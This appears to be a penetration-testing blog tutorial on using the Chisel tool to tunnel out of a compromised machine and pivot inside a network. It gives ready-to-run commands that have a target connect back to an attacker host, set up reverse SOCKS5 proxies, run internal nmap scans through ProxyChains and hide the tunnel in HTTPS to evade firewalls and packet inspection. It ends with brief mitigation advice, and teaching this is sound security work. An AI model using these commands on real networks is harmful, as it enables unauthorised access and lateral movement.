---
layout: default
---

# Chisel (Port forwarding)

Chisel is a fast TCP/UDP tunnel that operates over HTTP, secured via SSH. It enables port forwarding, tunneling, and pivoting, allowing attackers to bypass firewalls and establish communication between network segments. This article explores how to use Chisel effectively for tunneling and lateral movement in penetration testing scenarios.

<a href="https://github.com/jpillora/chisel" target="_blank">Chisel github repo</a>

Ensure both the attacker (server) and the target (client) have Chisel installed.
Chisel follows a client-server model where:
- the server listens for incoming connections and relays traffic
- the client connects to the server and forwards local or remote ports

Communication is encrypted and takes place over HTTP or WebSocket, allowing traffic to bypass network restrictions.

## Reverse VS Non-Reverse

<table>
    <tr>
        <th><span style="color: lightcoral">Feature</span></th>
        <th><span style="color: lightcoral">Non-Reverse</span></th>
        <th><span style="color: lightcoral">Reverse</span></th>
    </tr>
    <tr>
        <th>Who initiates the connection?</th>
        <th>Client connects to server</th>
        <th>Client waits for incoming server connections</th>
    </tr>
    <tr>
        <th>Ideal for?</th>
        <th>Exposing internal services</th>
        <th>Pivoting out of restricted networks</th>
    </tr>
    <tr>
        <th>Example Usage</th>
        <th>Forwarding SSH, RDP, or Web servers externally</th>
        <th>Setting up a SOCKS5 proxy for internal pivoting</th>
    </tr>
</table>

## Non-Reverse
Imagine an internal SSH server (192.168.1.10:22) behind a firewall that you need to access externally.

### Setting up Chisel
1. Start Chisel Server (attacker machine)
```
chisel server -p 8001
```
<span style="color: lightcoral">-p 8001</span>: specifies the listening port

2. Start Chisel Client (target machine)
```
chisel client <ATTACKER-IP>:8001 192.168.1.10:22:2222
```
This forwards the internal 192.168.1.10:22 (SSH server) to <ATTACKER-IP>:2222, allowing external access.

3. Now, the attacker can SSH into the internal system using:
```
ssh -p 2222 user@<ATTACKER-IP>
```

## Reverse
In reverse mode, Chisel works as follows:
- the attacker starts a Chisel server that listens for reverse connections.
- the target (client) connects back to the attacker's server, establishing a SOCKS5 tunnel.
- the attacker can then route traffic through the compromised machine, allowing network pivoting.

This is useful when the target is behind NAT or a firewall that prevents direct inbound connections.

A SOCKS proxy is an SSH encrypted tunnel in which configured applications forward their traffic down, and then, on the server-end, the proxy forwards the traffic to the general Internet.

### Setting up Chisel
1. Start Chisel Server (attacker machine)
```
chisel server -p 8001 --socks5 --reverse
```
<span style="color: lightcoral">--socks5</span>: enables SOCKS5 proxying for full network redirection
<br>
<span style="color: lightcoral">--reverse</span>: enables reverse tunneling (client-to-server connections)

2. Start Chisel Client (target machine)
```
chisel client <ATTACKER-IP>:8001 R:socks5
```
<span style="color: lightcoral">R:socks5</span>: sets up a reverse SOCKS5 tunnel, meaning all traffic sent to the attacker's machine is forwarded through the target.
At this point, the attacker can route traffic through the compromised system, effectively pivoting into the internal network.

### Pivoting through a compromised machine
Once the SOCKS5 tunnel is established, configure ProxyChains to use it. Edit the ProxyChains configuration file (/etc/proxychains.conf or /etc/proxychains4.conf):
```
socks5 127.0.0.1 1080
```
By default, Chisel listens on port 1080 for SOCKS5 traffic. Use ProxyChains to tunnel requests through the compromised system:
```
proxychains nmap -sT -Pn -p 80,443,3389 192.168.1.0/24
```
Now, Nmap scans will appear as originating from the target machine, allowing stealthy internal network reconnaissance.

### Accessing internal Web Services
To access internal websites through the tunnel:
- configure a web browser to use 127.0.0.1:1080 as a SOCKS5 proxy.
- navigate to internal sites like http://192.168.1.100, as if inside the target network.

### Bypassing firewalls with HTTPS tunneling
If network filtering blocks outbound connections, Chisel can tunnel over HTTPS:
1. Start the Chisel Server with TLS
```
chisel server -p 443 --tls --socks5 --reverse
```
2. Connect the target securely
```
chisel client https://<ATTACKER-IP>:443 R:socks5
```

This method hides the tunnel within HTTPS traffic, bypassing deep packet inspection (DPI).

## Mitigation Strategies
<span style="color: lightcoral">Monitor outgoing WebSocket and HTTP traffic</span> for anomalies.

<span style="color: lightcoral">Enforce network segmentation</span> to limit lateral movement.

<span style="color: lightcoral">Block unknown binaries</span> using application whitelisting.

<span style="color: lightcoral">Restrict outbound connections</span> to trusted domains/IPs.

<span style="color: lightcoral">Deploy deep packet inspection (DPI)</span> to detect unusual HTTPS traffic patterns.

<div class="row">
  <div class="column3"><a href="/pages/blog/4-pt-tools/0-pt-tools-home" style="font-size: 18px">Back<< Index</a></div>
  <div class="column1"></div>
  <div class="column3"><a href="/pages/blog/blog-home" style="font-size: 18px" >Next>> Coming soon!</a><div>
</div>